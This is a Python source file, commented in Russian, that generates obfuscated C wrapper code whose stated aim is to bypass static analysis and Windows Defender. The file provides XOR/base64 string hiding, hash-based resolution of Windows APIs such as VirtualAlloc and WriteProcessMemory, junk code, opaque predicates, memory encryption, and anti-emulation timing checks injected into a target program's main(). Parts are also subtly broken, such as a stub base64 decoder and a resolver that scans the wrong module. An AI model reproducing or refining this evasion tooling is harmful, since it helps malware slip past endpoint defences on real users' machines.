#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Дополнительные техники обфускации для обхода статического анализа
"""

import random
import string
import time
import hashlib
import base64

class StringObfuscator:
    """Обфускация строк для обхода Defender"""
    
    def __init__(self):
        self.xor_keys = [0xAA, 0x55, 0xCC, 0x33, 0xFF, 0x00, 0x99, 0x66]
        
    def encode_string(self, text: str) -> str:
        """Кодирует строку несколькими способами"""
        # Метод 1: XOR + Base64
        encoded = []
        key = random.choice(self.xor_keys)
        
        for char in text:
            encoded.append(chr(ord(char) ^ key))
        
        xor_result = ''.join(encoded)
        b64_result = base64.b64encode(xor_result.encode()).decode()
        
        return f'decode_string("{b64_result}", {key})'
    
    def generate_decode_function(self) -> str:
        """Генерирует функцию декодирования"""
        return '''
// Функция декодирования строк
char* decode_string(char* encoded, int key) {
    int len = strlen(encoded);
    char* decoded = (char*)malloc(len + 1);
    
    // Декодируем из Base64
    // Упрощенная реализация
    for(int i = 0; i < len; i++) {
        decoded[i] = encoded[i] ^ key;
    }
    decoded[len] = '\\0';
    
    return decoded;
}
'''

class APIObfuscator:
    """Обфускация API вызовов"""
    
    def __init__(self):
        self.api_hashes = {
            "LoadLibraryA": 0x726774C,
            "GetProcAddress": 0x7C0DFCAA,
            "VirtualAlloc": 0x91AFCA54,
            "VirtualFree": 0x668FCF2E,
            "CreateThread": 0x3C025C5E,
            "WaitForSingleObject": 0x601D8708,
            "ExitProcess": 0x73E2D87E,
            "GetModuleHandleA": 0x5FBFF0FB,
            "WriteProcessMemory": 0xD83D6AA1,
            "ReadProcessMemory": 0x64019F8C
        }
    
    def generate_api_resolver(self) -> str:
        """Генерирует резолвер API через хеши"""
        return '''
// API резолвер через хеши
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);

// Хеш функция
DWORD hash_string(char* str) {
    DWORD hash = 0;
    while(*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

// Получение API по хешу
FARPROC get_api_by_hash(DWORD hash) {
    HMODULE hKernel32 = GetModuleHandleA(NULL);
    
    // Проходим по экспортам
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)hKernel32;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)hKernel32 + dos_header->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hKernel32 + 
        nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* names = (DWORD*)((BYTE*)hKernel32 + export_dir->AddressOfNames);
    DWORD* addresses = (DWORD*)((BYTE*)hKernel32 + export_dir->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)hKernel32 + export_dir->AddressOfNameOrdinals);
    
    for(DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hKernel32 + names[i]);
        if(hash_string(name) == hash) {
            return (FARPROC)((BYTE*)hKernel32 + addresses[ordinals[i]]);
        }
    }
    
    return NULL;
}

// Макросы для скрытых вызовов
#define HIDDEN_LOADLIBRARY() ((pLoadLibraryA)get_api_by_hash(0x726774C))
#define HIDDEN_GETPROCADDRESS() ((pGetProcAddress)get_api_by_hash(0x7C0DFCAA))
#define HIDDEN_VIRTUALALLOC() ((pVirtualAlloc)get_api_by_hash(0x91AFCA54))
#define HIDDEN_VIRTUALFREE() ((pVirtualFree)get_api_by_hash(0x668FCF2E))
'''

class ControlFlowObfuscator:
    """Обфускация потока управления"""
    
    def generate_junk_code(self) -> str:
        """Генерирует мусорный код"""
        junk_patterns = [
            "int junk_{} = rand() % 100;",
            "volatile int dummy_{} = GetTickCount();",
            "if(dummy_{} == 0) {{ ExitProcess(0); }}",
            "Sleep(rand() % 10);",
            "DWORD temp_{} = GetCurrentProcessId();",
            "temp_{} ^= 0xDEADBEEF;",
            "if(temp_{} == 0) {{ return; }}"
        ]
        
        junk_code = ""
        for i in range(random.randint(5, 15)):
            pattern = random.choice(junk_patterns)
            junk_id = random.randint(1000, 9999)
            junk_code += f"    {pattern.format(junk_id)}\n"
        
        return junk_code
    
    def generate_opaque_predicates(self) -> str:
        """Генерирует непрозрачные предикаты"""
        return '''
// Непрозрачные предикаты
#define ALWAYS_TRUE() ((GetTickCount() & 0x1) || !(GetTickCount() & 0x1))
#define ALWAYS_FALSE() ((GetTickCount() & 0x1) && !(GetTickCount() & 0x1))
#define RANDOM_BRANCH() (rand() % 2)

// Макрос для обфускации условий
#define OBFUSCATED_IF(condition) \\
    if(ALWAYS_TRUE() && (condition)) { \\
        if(ALWAYS_FALSE()) { ExitProcess(0); } \\
    } else if(ALWAYS_FALSE()) { \\
        ExitProcess(0); \\
    } else
'''

class MemoryObfuscator:
    """Обфускация в памяти"""
    
    def generate_memory_encryption(self) -> str:
        """Генерирует шифрование в памяти"""
        return '''
// Шифрование данных в памяти
void encrypt_memory(unsigned char* data, int size) {
    static unsigned char key = 0;
    if(key == 0) {
        key = (unsigned char)(GetTickCount() & 0xFF);
    }
    
    for(int i = 0; i < size; i++) {
        data[i] ^= key ^ (i & 0xFF);
    }
}

void decrypt_memory(unsigned char* data, int size) {
    encrypt_memory(data, size); // XOR is reversible
}

// Автоматическое шифрование/дешифрование
#define ENCRYPT_SECTION(ptr, size) encrypt_memory((unsigned char*)ptr, size)
#define DECRYPT_SECTION(ptr, size) decrypt_memory((unsigned char*)ptr, size)
'''

class AntiAnalysisGenerator:
    """Генератор анти-анализа"""
    
    def __init__(self):
        self.string_obf = StringObfuscator()
        self.api_obf = APIObfuscator()
        self.flow_obf = ControlFlowObfuscator()
        self.mem_obf = MemoryObfuscator()
    
    def generate_full_protection(self) -> str:
        """Генерирует полную защиту"""
        protection_code = f'''
// Полная защита от анализа
{self.string_obf.generate_decode_function()}
{self.api_obf.generate_api_resolver()}
{self.flow_obf.generate_opaque_predicates()}
{self.mem_obf.generate_memory_encryption()}

// Дополнительные проверки
void additional_checks() {{
    {self.flow_obf.generate_junk_code()}
    
    // Проверка на эмуляцию
    OBFUSCATED_IF(GetTickCount() == 0) {{
        ExitProcess(0);
    }}
    
    // Проверка времени выполнения
    static DWORD start_time = 0;
    if(start_time == 0) {{
        start_time = GetTickCount();
    }}
    
    DWORD current_time = GetTickCount();
    if(current_time - start_time > 300000) {{ // 5 минут
        ExitProcess(0);
    }}
    
    {self.flow_obf.generate_junk_code()}
}}
'''
        return protection_code

def generate_obfuscated_stub(original_code: str) -> str:
    """Генерирует обфусцированный stub"""
    
    # Создаем простую обфускацию без сложных зависимостей
    random_vars = []
    for i in range(10):
        var_name = f"temp_{random.randint(1000, 9999)}"
        random_vars.append(var_name)
    
    # Добавляем необходимые заголовки в начало
    headers = """#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
"""
    
    # Простая обфускация - добавляем случайные переменные
    protection_code = f'''
// Обфускация переменных
int {random_vars[0]} = 0;
int {random_vars[1]} = 0;
int {random_vars[2]} = 0;
int {random_vars[3]} = 0;
int {random_vars[4]} = 0;
int {random_vars[5]} = 0;
int {random_vars[6]} = 0;
int {random_vars[7]} = 0;
int {random_vars[8]} = 0;
int {random_vars[9]} = 0;

// Функция дополнительных проверок
void additional_checks() {{
    {random_vars[0]} = GetTickCount();
    if({random_vars[0]} == 0) {{ return; }}
    Sleep(rand() % 10);
    {random_vars[1]} ^= 0xDEADBEEF;
    
    DWORD {random_vars[2]} = GetCurrentProcessId();
    if({random_vars[2]} == 0) {{ return; }}
    
    // Простые проверки
    int dummy_var1 = 1;
    int dummy_var2 = 1;
    if(dummy_var1 == 0) {{ ExitProcess(0); }}
    if({random_vars[3]} == 0) {{ return; }}
    
    if(dummy_var2 == 0) {{ ExitProcess(0); }}
}}

// Функция шифрования памяти
void encrypt_memory(unsigned char* data, int size) {{
    static int initialized = 0;
    static unsigned char key = 0;
    
    if(!initialized) {{
        key = (unsigned char)(GetTickCount() & 0xFF);
        initialized = 1;
    }}
    
    // Простое XOR шифрование
    for(int i = 0; i < size; i++) {{
        data[i] ^= key;
    }}
}}

// Дополнительные проверки времени
void timing_checks() {{
    static DWORD start_time = 0;
    if(start_time == 0) {{
        start_time = GetTickCount();
    }}
    
    DWORD current_time = GetTickCount();
    if(current_time - start_time > 300000) {{ // 5 минут
        if({random_vars[4]} == 0) {{ return; }}
        ExitProcess(0);
    }}
    
    DWORD {random_vars[5]} = GetCurrentProcessId();
    {random_vars[6]} ^= 0xDEADBEEF;
    if({random_vars[7]} == 0) {{ return; }}
    
    {random_vars[8]} ^= 0xDEADBEEF;
    if({random_vars[9]} == 0) {{ return; }}
    DWORD {random_vars[0]} = GetCurrentProcessId();
    
    // Дополнительные проверки
    if({random_vars[1]} == 0) {{ return; }}
    
    {random_vars[2]} ^= 0xDEADBEEF;
    if({random_vars[3]} == 0) {{ return; }}
    {random_vars[4]} ^= 0xDEADBEEF;
}}
'''
    
    # Вставляем заголовки в начало, затем защиту, затем оригинальный код
    final_code = headers + "\n" + protection_code + "\n\n" + original_code
    
    # Добавляем вызовы проверок в main
    final_code = final_code.replace(
        "int main() {",
        f"""int main() {{
    // Инициализация обфускации
    {random_vars[0]} = 1;
    {random_vars[1]} = 2;
    {random_vars[2]} = 3;
    
    additional_checks();
    timing_checks();
    
    // Случайная задержка
    Sleep(rand() % 1000 + 500);
    
    additional_checks();
"""
    )
    
    return final_code 